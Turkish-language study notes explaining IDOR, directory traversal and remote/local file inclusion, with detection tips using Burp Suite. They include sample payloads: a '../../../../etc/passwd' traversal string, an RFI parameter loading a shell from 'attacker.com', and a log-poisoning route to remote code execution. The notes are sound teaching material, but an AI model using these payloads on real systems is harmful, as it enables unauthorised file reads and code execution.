# IDOR (Insecure Direct Object Reference)

Uygulamanın kullanıcıdan aldığı girdilerin doğrulaması yapılmadan işlenmesiyle ortaya çıkan erişim denetimi zafiyetidir. Kullanıcı parametreleri değiştirerek diğer kullanıcıların verilerine erişim sağlayabilir ve işlem yapabilir. Örneğin `...msgid=1` yi `...msgid=33` yaparak başka birinin mesajını okuyabilir. Temel mantık bu isteklerin kontrolsüz olması, sunucu "bu kullanıcı bu kaynağa erişebilir mi?" kontrolü yapmıyor.

## Yaygın Yerler:
- API endpoint'leri (`/api/user/123`, `/order/456`)
- Dosya indirme linkleri (`/download?file=report_5.pdf`)
- Profil sayfaları (`/profile?userid=789`)
- Mesajlaşma sistemleri (`/message?id=1`)

## Tespit:
ID parametrelerini değiştir ve başka kullanıcının verisine erişip erişemediğini kontrol et. Burp Suite ile request'i yakala, ID'yi değiştir, yolla. Eğer yetkisiz erişim sağlanıyorsa IDOR var demektir.

# Directory Traversal
Yetkiniz olmayan bir dosyanın dizin atlayarak okunabilecek başka bir dosyanın yoluna gidilir. Buradaki `../../../../etc/passwd` örneğini verebiliriz. Bunun farklı farklı encoding'leri olabilir.

# RFI/LFI (Remote/Local File Inclusion)

Uygulamanın dahil ettiği (include) dosyaları manipüle ederek kendi kodunuzu çalıştırma zafiyetidir.

**RFI (Remote File Inclusion):** Uzaktaki bir sunucudan zararlı dosya çalıştırabilirsiniz. Örneğin `?page=http://attacker.com/shell.php` gibi. Uygulama bu remote dosyayı include edip çalıştırıyor.

**LFI (Local File Inclusion):** Sunucuda zaten var olan bir dosyayı include edip çalıştırırsınız. Directory traversal ile bulduğumuz bir dosya yolunu (log dosyaları, upload edilen dosyalar, txt dosyaları gibi) include parametresine veririz. Örneğin log dosyasına zararlı kod yazdırıp sonra o log'u include ettirerek RCE (Remote Code Execution) elde edebiliriz. Aynı mantıkta çalışır ama kaynak local.

RFI -> harici kaynak, LFI -> local kaynak. İkisi de dosya include mekanizmasını kötüye kullanır.
